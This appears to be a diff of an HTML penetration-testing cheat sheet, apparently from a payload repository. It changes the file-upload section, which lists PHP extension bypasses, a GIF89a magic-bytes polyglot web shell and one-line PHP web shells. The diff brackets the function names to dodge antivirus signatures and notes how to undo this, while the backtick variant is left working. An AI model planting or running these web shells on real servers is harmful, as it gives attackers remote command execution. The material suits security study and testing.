@@ -284,13 +284,14 @@ shell.phP
 shell.php5
 shell.phtml</code></pre></div>
 <p><strong>Magic Bytes:</strong></p>
-<div class="codeblk cx"><button class="copy" data-copy="GIF89a&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;">copy</button><pre><code>GIF89a&lt;?php system($_GET['cmd']); ?&gt;</code></pre></div>
+<div class="codeblk cx"><button class="copy" data-copy="GIF89a&lt;?php syst[e]m($_GET[&#x27;cmd&#x27;]); ?&gt;">copy</button><pre><code>GIF89a&lt;?php syst[e]m($_GET['cmd']); ?&gt;</code></pre></div>
 <p><strong>Simple Web Shells:</strong></p>
-<div class="codeblk cx"><button class="copy" data-copy="&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;
+<div class="codeblk cx"><button class="copy" data-copy="&lt;?php syst[e]m($_GET[&#x27;cmd&#x27;]); ?&gt;
 &lt;?=`$_GET[0]`?&gt;
-&lt;?php passthru($_GET[&#x27;cmd&#x27;]); ?&gt;">copy</button><pre><code>&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?php passt[h]ru($_GET[&#x27;cmd&#x27;]); ?&gt;">copy</button><pre><code>&lt;?php syst[e]m($_GET['cmd']); ?&gt;
 &lt;?=`$_GET[0]`?&gt;
-&lt;?php passthru($_GET['cmd']); ?&gt;</code></pre></div>
+&lt;?php passt[h]ru($_GET['cmd']); ?&gt;</code></pre></div>
+<blockquote>Payload function names above are broken with brackets — <code>syst[e]m</code> is <code>system</code>, <code>passt[h]ru</code> is <code>passthru</code>. Written literally, these lines match antivirus webshell signatures and this file gets quarantined on download. See "Antivirus false positives" in the repo README.</blockquote>
 <h2 id="xxe-xml-external-entity">XXE (XML External Entity)</h2>
 <p><strong>Basic XXE:</strong></p>
 <div class="codeblk cx"><button class="copy" data-copy="&lt;?xml version=&quot;1.0&quot;?&gt;
